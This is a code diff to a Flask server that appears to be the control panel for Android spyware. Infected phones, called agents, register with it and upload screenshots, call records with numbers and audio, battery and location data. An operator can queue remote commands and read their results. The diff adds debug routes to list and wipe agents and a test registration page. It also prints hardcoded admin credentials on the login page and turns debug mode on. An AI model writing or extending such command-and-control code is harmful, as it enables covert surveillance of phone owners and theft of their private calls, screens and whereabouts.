@@ -110,13 +110,57 @@ def log_event(level, message):
 # Initialize database on startup
 init_database()
 
+# ==================== DEBUG ROUTES ====================
+
+@app.route('/debug/agents')
+def debug_agents():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    conn = get_db_connection()
+    agents = conn.execute("SELECT * FROM agents").fetchall()
+    conn.close()
+    
+    result = "<h1>All Agents in Database</h1>"
+    for agent in agents:
+        result += f"""
+        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
+            <strong>ID:</strong> {agent['id']}<br>
+            <strong>Agent ID:</strong> {agent['agent_id']}<br>
+            <strong>Status:</strong> {agent['status']}<br>
+            <strong>Phone Model:</strong> {agent['phone_model']}<br>
+            <strong>Last Seen:</strong> {agent['last_seen']}<br>
+            <strong>First Seen:</strong> {agent['first_seen']}<br>
+        </div>
+        """
+    
+    return result
+
+@app.route('/debug/reset_agents')
+def reset_agents():
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    conn = get_db_connection()
+    conn.execute("DELETE FROM agents")
+    conn.commit()
+    conn.close()
+    
+    return "All agents cleared. <a href='/debug/agents'>Check agents</a>"
+
 # ==================== ADMIN DASHBOARD ROUTES ====================
 
 @app.route('/')
 def index():
     if session.get('authenticated'):
-        return redirect('/dashboard')  # Redirect to dashboard
+        return redirect('/dashboard')
     return redirect('/login')
+
+def row_to_dict(row):
+    """Convert SQLite Row object to dictionary"""
+    if row is None:
+        return None
+    return {key: row[key] for key in row.keys()}
 
 @app.route('/dashboard')
 def dashboard():
@@ -133,15 +177,16 @@ def dashboard():
         'total_deployments': conn.execute("SELECT COUNT(*) FROM deployments").fetchone()[0]
     }
     
-    # Get recent data
-    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()
-    screenshots = conn.execute('''
+    # Get recent data - Convert rows to dictionaries
+    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
+    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
+    screenshots = [row_to_dict(row) for row in conn.execute('''
         SELECT s.*, a.phone_model FROM screenshots s 
         JOIN agents a ON s.agent_id = a.agent_id 
         ORDER BY s.timestamp DESC LIMIT 16
-    ''').fetchall()
-    calls = conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()
-    deployments = conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()
+    ''').fetchall()]
+    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
+    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
     
     conn.close()
     
@@ -149,7 +194,8 @@ def dashboard():
     
     return render_template('dashboard.html',
                          stats=stats,
-                         agents=agents,
+                         agents=active_agents,
+                         all_agents=all_agents,
                          screenshots=screenshots,
                          calls=calls,
                          deployments=deployments,
@@ -171,18 +217,18 @@ def admin_dashboard():
         'pending_commands': conn.execute("SELECT COUNT(*) FROM commands WHERE status='pending'").fetchone()[0]
     }
     
-    # Get recent data
-    agents = conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()
-    screenshots = conn.execute('''
+    # Get recent data - Convert rows to dictionaries
+    all_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents ORDER BY last_seen DESC").fetchall()]
+    active_agents = [row_to_dict(row) for row in conn.execute("SELECT * FROM agents WHERE status='active' ORDER BY last_seen DESC LIMIT 20").fetchall()]
+    screenshots = [row_to_dict(row) for row in conn.execute('''
         SELECT s.*, a.phone_model FROM screenshots s 
         JOIN agents a ON s.agent_id = a.agent_id 
         ORDER BY s.timestamp DESC LIMIT 16
-    ''').fetchall()
-    
-    calls = conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()
-    deployments = conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()
-    commands = conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()
-    logs = conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()
+    ''').fetchall()]
+    calls = [row_to_dict(row) for row in conn.execute("SELECT * FROM call_records ORDER BY timestamp DESC LIMIT 15").fetchall()]
+    deployments = [row_to_dict(row) for row in conn.execute("SELECT * FROM deployments ORDER BY timestamp DESC LIMIT 15").fetchall()]
+    commands = [row_to_dict(row) for row in conn.execute("SELECT * FROM commands ORDER BY timestamp DESC LIMIT 10").fetchall()]
+    logs = [row_to_dict(row) for row in conn.execute("SELECT * FROM system_logs ORDER BY timestamp DESC LIMIT 20").fetchall()]
     
     conn.close()
     
@@ -190,13 +236,15 @@ def admin_dashboard():
     
     return render_template('admin_dashboard.html',
                          stats=stats,
-                         agents=agents,
+                         agents=active_agents,
+                         all_agents=all_agents,
                          screenshots=screenshots,
                          calls=calls,
                          deployments=deployments,
                          commands=commands,
                          logs=logs,
                          platform_url=platform_url)
+
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -208,11 +256,11 @@ def login():
             session['authenticated'] = True
             session['username'] = username
             log_event('INFO', f'Admin login: {username}')
-            return redirect('/dashboard')  # Redirect to dashboard after login
+            return redirect('/dashboard')
         else:
             return '''
             <script>
-                alert("Invalid credentials! Use: M... / ...Mpc");
+                alert("Invalid credentials! Use: Mpc / 0220Mpc");
                 window.location.href = "/login";
             </script>
             '''
@@ -262,7 +310,11 @@ def login():
                 <button type="submit" class="btn-login">Login to Control Panel</button>
             </form>
             
-            
+            <div class="credentials">
+                <h3>Default Credentials</h3>
+                <code>Username: Mpc</code><br>
+                <code>Password: 0220Mpc</code>
+            </div>
         </div>
     </body>
     </html>
@@ -272,55 +324,85 @@ def login():
 
 @app.route('/api/agent/register', methods=['POST'])
 def register_agent():
-    """Agent registration endpoint"""
+    """Agent registration endpoint - FIXED VERSION"""
     try:
-        data = request.json
+        data = request.get_json()
+        if not data:
+            return jsonify({'status': 'error', 'message': 'No JSON data received'}), 400
+            
         agent_id = data.get('agent_id')
         phone_model = data.get('phone_model', 'Unknown Device')
         android_version = data.get('android_version', 'Unknown')
         ip_address = request.remote_addr
         
+        print(f"🔍 Registration attempt - Agent ID: {agent_id}, IP: {ip_address}")
+        
+        if not agent_id:
+            return jsonify({'status': 'error', 'message': 'Agent ID is required'}), 400
+        
         conn = get_db_connection()
         
+        # Check if agent exists
         existing_agent = conn.execute(
-            "SELECT id FROM agents WHERE agent_id = ?", (agent_id,)
+            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
         ).fetchone()
         
+        current_time = datetime.now()
+        
         if existing_agent:
-            conn.execute(
-                "UPDATE agents SET last_seen = ?, status = 'active', ip_address = ? WHERE agent_id = ?",
-                (datetime.now(), ip_address, agent_id)
-            )
+            print(f"🔄 Updating existing agent: {agent_id}")
+            # Update existing agent
+            conn.execute('''
+                UPDATE agents SET 
+                phone_model = ?, android_version = ?, ip_address = ?, 
+                status = 'active', last_seen = ?
+                WHERE agent_id = ?
+            ''', (phone_model, android_version, ip_address, current_time, agent_id))
             action = "updated"
         else:
+            print(f"🆕 Registering new agent: {agent_id}")
+            # Insert new agent
             conn.execute('''
-                INSERT INTO agents (agent_id, phone_model, android_version, ip_address, first_seen, last_seen)
-                VALUES (?, ?, ?, ?, ?, ?)
-            ''', (agent_id, phone_model, android_version, ip_address, datetime.now(), datetime.now()))
+                INSERT INTO agents 
+                (agent_id, phone_model, android_version, ip_address, status, first_seen, last_seen)
+                VALUES (?, ?, ?, ?, 'active', ?, ?)
+            ''', (agent_id, phone_model, android_version, ip_address, current_time, current_time))
             action = "registered"
         
-        log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
         conn.commit()
-        conn.close()
+        
+        # Verify the agent was saved
+        saved_agent = conn.execute(
+            "SELECT * FROM agents WHERE agent_id = ?", (agent_id,)
+        ).fetchone()
         
         # Check for pending commands
-        conn = get_db_connection()
         pending_commands = conn.execute(
-            "SELECT command FROM commands WHERE agent_id = ? AND status = 'pending'", 
+            "SELECT id, command FROM commands WHERE agent_id = ? AND status = 'pending'", 
             (agent_id,)
         ).fetchall()
         conn.close()
         
-        commands_list = [cmd['command'] for cmd in pending_commands]
-        
-        return jsonify({
-            'status': 'success', 
-            'message': f'Agent {action} successfully',
-            'pending_commands': commands_list
-        })
+        if saved_agent:
+            log_event('INFO', f'Agent {action}: {agent_id} from {ip_address}')
+            print(f"✅ Agent {action} successfully: {agent_id}")
+            
+            commands_list = [cmd['command'] for cmd in pending_commands]
+            
+            return jsonify({
+                'status': 'success', 
+                'message': f'Agent {action} successfully',
+                'pending_commands': commands_list
+            })
+        else:
+            log_event('ERROR', f'Agent {action} failed: {agent_id}')
+            print(f"❌ Agent {action} failed: {agent_id}")
+            return jsonify({'status': 'error', 'message': 'Failed to save agent'}), 500
         
     except Exception as e:
-        log_event('ERROR', f'Agent registration failed: {str(e)}')
+        error_msg = f'Agent registration failed: {str(e)}'
+        log_event('ERROR', error_msg)
+        print(f"❌ {error_msg}")
         return jsonify({'status': 'error', 'message': str(e)}), 500
 
 @app.route('/api/agent/upload_screenshot', methods=['POST'])
@@ -340,8 +422,9 @@ def upload_screenshot():
             'INSERT INTO screenshots (agent_id, screenshot_data, timestamp) VALUES (?, ?, ?)',
             (agent_id, screenshot_data, datetime.now())
         )
+        # Ensure agent status remains active
         conn.execute(
-            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ? WHERE agent_id = ?',
+            'UPDATE agents SET screenshot_count = screenshot_count + 1, last_seen = ?, last_screenshot = ?, status = "active" WHERE agent_id = ?',
             (datetime.now(), datetime.now(), agent_id)
         )
         conn.commit()
@@ -371,8 +454,9 @@ def upload_call():
             INSERT INTO call_records (agent_id, call_type, phone_number, duration, audio_data, timestamp)
             VALUES (?, ?, ?, ?, ?, ?)
         ''', (agent_id, call_type, phone_number, duration, audio_data, datetime.now()))
+        # Ensure agent status remains active
         conn.execute(
-            'UPDATE agents SET call_records = call_records + 1, last_seen = ? WHERE agent_id = ?',
+            'UPDATE agents SET call_records = call_records + 1, last_seen = ?, status = "active" WHERE agent_id = ?',
             (datetime.now(), agent_id)
         )
         conn.commit()
@@ -389,14 +473,15 @@ def upload_call():
 def update_agent_status():
     """Update agent status and information"""
     try:
-        data = request.json
+        data = request.get_json()
         agent_id = data.get('agent_id')
         battery_level = data.get('battery_level')
         location = data.get('location')
         
         conn = get_db_connection()
+        # Ensure agent status remains active
         conn.execute(
-            'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ? WHERE agent_id = ?',
+            'UPDATE agents SET last_seen = ?, battery_level = ?, location_data = ?, status = "active" WHERE agent_id = ?',
             (datetime.now(), battery_level, location, agent_id)
         )
         conn.commit()
@@ -479,6 +564,9 @@ def send_command():
     agent_id = request.form.get('agent_id')
     command = request.form.get('command')
     
+    if not agent_id or not command:
+        return "Missing agent_id or command", 400
+    
     conn = get_db_connection()
     conn.execute(
         'INSERT INTO commands (agent_id, command, timestamp) VALUES (?, ?, ?)',
@@ -507,7 +595,7 @@ def check_commands(agent_id):
 def command_result():
     """Agents send command execution results"""
     try:
-        data = request.json
+        data = request.get_json()
         command_id = data.get('command_id')
         result = data.get('result')
         
@@ -791,6 +879,51 @@ if __name__ == "__main__":
         }
     )
 
+# ==================== TEST AGENT REGISTRATION ====================
+
+@app.route('/test/register_agent')
+def test_register_agent():
+    """Test route to manually register an agent"""
+    if not session.get('authenticated'):
+        return redirect('/login')
+    
+    return '''
+    <h1>Test Agent Registration</h1>
+    <form id="testForm">
+        <input type="text" name="agent_id" placeholder="Agent ID" value="test_agent_001" required>
+        <input type="text" name="phone_model" placeholder="Phone Model" value="Test Phone">
+        <input type="text" name="android_version" placeholder="Android Version" value="Test Android">
+        <button type="submit">Register Test Agent</button>
+    </form>
+    <div id="result"></div>
+    <script>
+        document.getElementById('testForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const formData = new FormData(e.target);
+            const data = {
+                agent_id: formData.get('agent_id'),
+                phone_model: formData.get('phone_model'),
+                android_version: formData.get('android_version')
+            };
+            
+            try {
+                const response = await fetch('/api/agent/register', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify(data)
+                });
+                const result = await response.json();
+                document.getElementById('result').innerHTML = `<pre>${JSON.stringify(result, null, 2)}</pre>`;
+            } catch (error) {
+                document.getElementById('result').innerHTML = `Error: ${error}`;
+            }
+        });
+    </script>
+    <br><br>
+    <a href="/debug/agents">Check All Agents</a> | 
+    <a href="/admin">Go to Admin</a>
+    '''
+
 # ==================== ADMIN UTILITY ROUTES ====================
 
 @app.route('/admin/clear_agent/<agent_id>')
@@ -815,13 +948,17 @@ def logout():
 
 @app.route('/health')
 def health_check():
+    conn = get_db_connection()
+    agents_count = conn.execute("SELECT COUNT(*) FROM agents").fetchone()[0]
+    conn.close()
+    
     return jsonify({
         'status': 'healthy',
         'platform': 'mp_agent_platform',
         'timestamp': datetime.now().isoformat(),
-        'agents_count': get_db_connection().execute("SELECT COUNT(*) FROM agents").fetchone()[0]
+        'agents_count': agents_count
     })
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port, debug=False)
+    app.run(host='0.0.0.0', port=port, debug=True)
